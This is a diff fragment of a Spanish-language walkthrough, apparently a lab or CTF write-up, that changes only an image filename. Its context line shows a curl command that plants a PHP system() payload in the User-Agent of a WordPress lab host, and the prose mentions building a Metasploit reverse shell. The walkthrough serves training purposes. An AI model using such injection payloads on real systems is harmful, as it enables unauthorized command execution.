@@ -388,7 +388,7 @@ curl -A "<?php system('dir'); ?>" http://tripladvisor:8080/wordpress
 
 Vamos a probar a ver los archivos del directorio actual realizando un comando `dir`, ahora si recargamos de nuevo la `URL` y bajamos abajo del todo veremos lo siguiente:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos a subirnos a generarnos una `reverse shell` con `metasploit` para tener un `meterpreter` por lo que tendremos que generar el `payload` de la siguiente forma:
 
